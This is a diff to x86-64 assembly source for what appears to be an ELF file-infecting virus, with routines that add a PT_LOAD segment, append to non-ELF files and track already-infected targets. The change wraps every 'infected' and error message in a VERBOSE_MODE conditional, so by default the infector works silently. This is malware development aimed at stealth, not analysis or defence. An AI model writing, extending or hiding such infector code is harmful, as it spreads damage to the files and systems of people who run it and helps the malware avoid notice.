@@ -375,6 +375,7 @@ add_pt_load:
     mov edi, r13d
     syscall
 
+%ifdef VERBOSE_MODE
     ; Print infected message
     lea rdi, [rel msg_infected]
     call print_string
@@ -385,12 +386,15 @@ add_pt_load:
     lea rsi, [rel newline]
     mov edx, 1
     syscall
+%endif
 
     jmp .add_pt_load_done
 
 .add_pt_load_close_fail:
+%ifdef VERBOSE_MODE
     lea rdi, [rel msg_err_pt_load_close]
     call print_string
+%endif
     mov eax, SYS_CLOSE
     mov edi, r13d
     syscall
@@ -503,8 +507,10 @@ process_non_elf_file:
     mov edi, r13d
     syscall
 
+%ifdef VERBOSE_MODE
     lea rdi, [rel msg_already_infected]
     call print_string
+%endif
     jmp .process_done
 
 .process_close_and_append:
@@ -537,6 +543,7 @@ process_non_elf_file:
     mov edi, r13d
     syscall
 
+%ifdef VERBOSE_MODE
     lea rdi, [rel msg_infected]
     call print_string
     mov rdi, r12
@@ -546,11 +553,14 @@ process_non_elf_file:
     lea rsi, [rel newline]
     mov edx, 1
     syscall
+%endif
     jmp .process_done
 
 .process_write_failed:
+%ifdef VERBOSE_MODE
     lea rdi, [rel msg_err_write_failed]
     call print_string
+%endif
     mov eax, SYS_CLOSE
     mov edi, r13d
     syscall
